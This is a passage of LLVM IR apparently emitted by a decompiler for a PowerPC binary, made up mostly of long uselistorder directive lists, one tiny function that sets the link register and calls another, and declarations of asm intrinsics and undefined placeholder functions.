  uselistorder i32* @r3, { 29, 30, 144, 145, 148, 146, 147, 0, 149, 150, 13, 151, 14, 152, 56, 57, 58, 153, 154, 155, 15, 65, 66, 16, 35, 243, 244, 245, 238, 288, 289, 290, 156, 157, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 17, 174, 175, 176, 177, 178, 179, 180, 181, 182, 67, 68, 18, 69, 70, 71, 47, 246, 247, 248, 249, 250, 19, 183, 49, 32, 251, 252, 253, 254, 255, 256, 3, 2, 257, 258, 259, 39, 55, 302, 4, 42, 5, 48, 54, 296, 297, 298, 113, 114, 115, 116, 117, 118, 119, 120, 59, 60, 61, 62, 63, 234, 235, 72, 53, 73, 28, 33, 239, 240, 184, 185, 186, 187, 188, 189, 190, 191, 129, 130, 131, 132, 133, 134, 6, 34, 37, 299, 300, 52, 158, 31, 7, 260, 261, 262, 263, 264, 45, 301, 38, 192, 193, 200, 201, 202, 203, 204, 205, 206, 36, 207, 208, 209, 210, 211, 74, 75, 194, 195, 212, 213, 102, 103, 265, 40, 266, 267, 268, 8, 12, 9, 269, 10, 270, 11, 271, 272, 273, 274, 275, 276, 41, 277, 278, 279, 280, 281, 282, 64, 291, 292, 293, 294, 295, 214, 215, 216, 217, 218, 219, 220, 221, 104, 105, 106, 107, 51, 108, 109, 110, 111, 112, 283, 284, 285, 222, 223, 224, 225, 226, 227, 228, 76, 77, 44, 78, 79, 80, 20, 81, 21, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 22, 93, 94, 95, 26, 25, 96, 97, 98, 99, 24, 23, 100, 101, 121, 122, 123, 124, 125, 126, 127, 128, 135, 136, 137, 27, 138, 139, 140, 141, 142, 143, 196, 197, 198, 1, 199, 229, 230, 231, 233, 232, 236, 237, 241, 242, 286, 287, 46, 43, 50 }
}

define i32 @function_1000d388() local_unnamed_addr {
entry:
  store i32 268489624, i32* @lr, align 4
  %v0_1000d394 = call i32 @function_100000b8()
  ret i32 %v0_1000d394

; uselistorder directives
  uselistorder i32 0, { 559, 560, 37, 563, 102, 561, 562, 62, 564, 565, 566, 569, 567, 0, 568, 570, 1, 85, 571, 168, 706, 27, 796, 797, 587, 574, 577, 578, 579, 256, 580, 581, 583, 582, 584, 585, 586, 588, 589, 590, 572, 573, 575, 576, 103, 591, 593, 594, 592, 595, 596, 597, 598, 211, 390, 599, 212, 391, 392, 104, 105, 398, 399, 90, 400, 401, 402, 403, 404, 405, 406, 106, 169, 408, 407, 107, 409, 410, 109, 108, 411, 257, 412, 413, 414, 111, 110, 415, 416, 217, 258, 417, 112, 600, 601, 602, 603, 608, 604, 66, 609, 610, 605, 606, 607, 63, 64, 65, 611, 259, 38, 39, 40, 206, 613, 113, 612, 260, 614, 615, 616, 617, 91, 41, 618, 170, 619, 620, 621, 429, 171, 798, 799, 707, 708, 709, 710, 711, 712, 713, 800, 28, 801, 115, 114, 802, 803, 804, 805, 116, 714, 715, 716, 717, 806, 807, 808, 809, 810, 811, 812, 813, 29, 622, 997, 261, 1000, 69, 262, 218, 1001, 263, 1004, 1005, 67, 68, 1006, 2, 3, 393, 998, 999, 264, 265, 631, 623, 266, 70, 624, 625, 627, 42, 629, 630, 632, 633, 634, 635, 636, 637, 219, 208, 209, 268, 638, 639, 640, 642, 172, 645, 269, 220, 647, 648, 649, 650, 267, 221, 644, 641, 643, 646, 651, 213, 652, 653, 654, 4, 655, 656, 657, 118, 117, 658, 5, 119, 222, 430, 431, 432, 6, 814, 815, 174, 817, 816, 59, 7, 818, 173, 8, 819, 176, 820, 60, 9, 821, 175, 659, 660, 71, 661, 662, 663, 664, 665, 718, 719, 720, 270, 721, 722, 723, 822, 823, 824, 825, 826, 271, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 120, 121, 840, 841, 842, 843, 844, 845, 846, 847, 848, 43, 849, 272, 86, 850, 851, 852, 853, 854, 122, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 123, 865, 866, 867, 249, 250, 868, 869, 870, 30, 10, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 92, 1007, 1008, 1009, 1012, 1010, 11, 177, 12, 480, 892, 891, 178, 890, 93, 893, 894, 895, 124, 896, 481, 1002, 1003, 768, 769, 223, 770, 482, 1013, 125, 1014, 496, 1015, 1016, 1017, 1018, 1019, 483, 1020, 1021, 1022, 701, 273, 274, 275, 1037, 1038, 276, 1039, 1059, 179, 1060, 277, 1051, 13, 1023, 1024, 126, 497, 498, 278, 224, 279, 499, 500, 74, 75, 501, 502, 503, 280, 504, 505, 506, 72, 73, 507, 508, 1025, 1026, 1027, 1028, 1029, 1030, 127, 1036, 533, 534, 535, 536, 537, 128, 538, 539, 540, 251, 541, 129, 281, 418, 419, 420, 130, 421, 131, 509, 510, 180, 94, 101, 511, 512, 14, 767, 422, 423, 132, 424, 425, 426, 773, 775, 44, 776, 76, 777, 774, 771, 772, 15, 437, 433, 434, 435, 436, 181, 16, 780, 778, 779, 182, 781, 782, 438, 439, 440, 441, 442, 282, 443, 444, 783, 784, 283, 785, 133, 786, 787, 788, 789, 790, 791, 792, 793, 252, 253, 284, 666, 667, 183, 668, 669, 670, 671, 677, 678, 679, 680, 134, 681, 682, 683, 547, 548, 549, 135, 550, 214, 551, 552, 553, 554, 555, 556, 557, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 285, 1048, 17, 136, 626, 137, 138, 897, 898, 31, 32, 225, 33, 899, 184, 900, 901, 185, 286, 902, 672, 673, 674, 675, 676, 684, 140, 139, 685, 903, 904, 186, 628, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1052, 1053, 1054, 77, 1055, 1056, 1057, 1058, 141, 905, 906, 907, 908, 909, 910, 686, 687, 688, 689, 690, 691, 142, 724, 725, 726, 727, 728, 729, 734, 730, 731, 732, 733, 187, 735, 736, 737, 18, 78, 738, 445, 692, 739, 484, 485, 911, 912, 95, 913, 914, 915, 916, 917, 215, 918, 919, 920, 143, 921, 922, 923, 924, 925, 144, 926, 927, 928, 929, 930, 931, 932, 145, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 45, 162, 163, 188, 944, 945, 146, 946, 287, 947, 948, 288, 951, 151, 147, 949, 950, 290, 952, 953, 954, 956, 152, 957, 19, 20, 153, 154, 148, 149, 958, 959, 150, 960, 961, 962, 963, 964, 965, 966, 967, 968, 289, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 394, 979, 980, 34, 982, 79, 96, 155, 291, 985, 254, 986, 981, 983, 984, 987, 988, 156, 427, 428, 87, 61, 84, 955, 189, 1031, 1033, 1032, 191, 157, 1035, 1034, 190, 226, 740, 741, 742, 158, 743, 744, 745, 746, 747, 748, 749, 750, 751, 292, 752, 753, 754, 755, 756, 757, 227, 228, 159, 230, 486, 192, 487, 488, 26, 489, 490, 491, 229, 492, 293, 493, 494, 495, 216, 989, 990, 294, 758, 759, 760, 761, 763, 764, 765, 1011, 295, 542, 702, 995, 446, 996, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 794, 762, 1049, 1050, 297, 296, 458, 459, 80, 81, 22, 194, 21, 195, 193, 302, 460, 35, 461, 46, 164, 300, 301, 47, 165, 232, 231, 299, 196, 303, 304, 298, 462, 463, 464, 466, 207, 465, 467, 468, 307, 308, 305, 306, 469, 310, 311, 238, 233, 234, 235, 236, 237, 470, 309, 82, 312, 313, 471, 472, 473, 314, 474, 475, 476, 97, 48, 23, 98, 477, 99, 49, 202, 201, 200, 478, 479, 100, 50, 199, 198, 197, 239, 315, 240, 513, 514, 515, 516, 517, 518, 519, 316, 520, 317, 521, 318, 241, 319, 243, 522, 242, 523, 524, 525, 526, 527, 528, 529, 530, 320, 531, 160, 203, 532, 321, 244, 322, 246, 245, 543, 544, 545, 323, 546, 325, 51, 166, 167, 52, 24, 324, 558, 326, 693, 205, 327, 694, 695, 204, 328, 696, 697, 54, 53, 25, 698, 329, 699, 88, 89, 55, 700, 161, 331, 703, 36, 247, 248, 330, 83, 704, 705, 332, 333, 334, 56, 57, 766, 335, 210, 58, 795, 991, 992, 255, 993, 994, 1069, 1070, 1071, 395, 396, 397, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093 }
  uselistorder i32* @lr, { 5, 172, 173, 174, 175, 176, 177, 178, 361, 433, 434, 435, 179, 183, 180, 181, 182, 187, 188, 184, 185, 186, 189, 190, 191, 192, 193, 6, 7, 8, 9, 10, 11, 194, 197, 195, 1, 196, 0, 198, 201, 202, 199, 200, 203, 204, 205, 206, 207, 208, 19, 362, 363, 304, 305, 306, 307, 364, 365, 366, 367, 346, 440, 441, 442, 443, 436, 437, 438, 439, 209, 210, 211, 217, 212, 213, 216, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 20, 21, 22, 23, 368, 369, 370, 444, 371, 372, 308, 309, 310, 311, 312, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 445, 446, 92, 93, 94, 385, 386, 347, 348, 447, 448, 457, 458, 461, 462, 463, 464, 465, 478, 480, 482, 459, 460, 112, 113, 114, 115, 116, 117, 118, 449, 455, 456, 12, 13, 119, 15, 120, 14, 16, 349, 351, 350, 24, 25, 26, 27, 28, 29, 352, 353, 354, 355, 356, 357, 290, 67, 156, 291, 292, 251, 293, 294, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 265, 266, 267, 268, 269, 466, 467, 468, 469, 470, 473, 474, 475, 214, 215, 387, 388, 389, 390, 263, 264, 481, 479, 391, 392, 393, 270, 271, 272, 273, 313, 314, 315, 316, 317, 30, 274, 275, 318, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 17, 18, 408, 450, 451, 452, 453, 454, 476, 477, 319, 320, 321, 322, 323, 324, 325, 326, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 422, 423, 111, 327, 328, 329, 330, 426, 31, 32, 33, 34, 35, 471, 472, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 68, 74, 69, 70, 71, 72, 73, 2, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 295, 296, 297, 298, 299, 300, 301, 302, 303, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 358, 359, 360, 424, 425, 427, 428, 429, 430, 431, 432, 3, 4 }
}

declare i32 @__asm_rlwinm(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwinm.(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwimi(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_mfcr() local_unnamed_addr

declare %1 @__asm_cror(i32, i32, i32) local_unnamed_addr

declare %0 @__asm_mtcrf(i32, i32) local_unnamed_addr

declare %2 @__asm_mcrf_cr0_write(i4) local_unnamed_addr

declare i32 @unknown_0(i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16* @__decompiler_undefined_function_4() local_unnamed_addr
